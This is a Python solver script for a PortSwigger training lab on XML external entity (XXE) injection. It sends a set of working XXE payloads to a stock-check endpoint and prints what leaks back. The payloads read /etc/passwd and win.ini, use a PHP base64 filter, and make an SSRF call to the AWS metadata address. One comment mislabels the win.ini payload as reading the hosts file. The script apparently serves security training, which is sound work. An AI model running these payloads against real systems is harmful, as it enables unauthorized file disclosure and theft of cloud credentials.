#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Exploiting XXE using external entities to retrieve files".

The stock checker parses XML you submit. XML lets a document define external
entities that pull in the contents of a file, and this parser resolves them.
We define an entity pointing at /etc/passwd, reference it where the product
ID goes, and the file's contents come back in the response.

Lab: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import re
import sys
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

# A spread of XXE payloads: Unix and Windows file reads, the PHP filter
# wrapper (returns base64 even for non-text files), and the SSRF variant
# that reaches the cloud metadata endpoint instead of a file. Each defines
# an external entity and references it as &xxe; in productId. The script
# tries each and reports the first that reflects data back.
PAYLOADS = [
    # Unix: read /etc/passwd
    ('/etc/passwd', 'root:', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"""),

    # Windows: read the hosts file
    ('C:/Windows/win.ini', '[', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"""),

    # PHP filter wrapper: base64-encodes the file so it survives the parser
    ('/etc/passwd (php filter)', 'PD9', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"""),

    # SSRF: reach the cloud metadata endpoint instead of a file
    ('AWS metadata (SSRF)', 'ami-', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"""),
]


def fetch(path, method="GET", data=None, headers=None, allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data, headers=headers,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def check_xxe():
    print("[*] Trying XXE payloads...")
    for label, marker, payload in PAYLOADS:
        resp = fetch("product/stock", method="POST", data=payload,
                     headers={"Content-Type": "application/xml"})

        if marker in resp.text:
            match = re.search(marker + r'[^<"]*', resp.text)
            leaked = match.group().strip()
            print(f"[+] {label}:\n")
            print(leaked)
            print()
            report("XXE", True, f"leaked {label} via external entity")
            return

    report("XXE", False, "no payload returned file contents")

def parse_args():
    parser = argparse.ArgumentParser(
        description="Read a local file via XXE external-entity injection (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_xxe()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()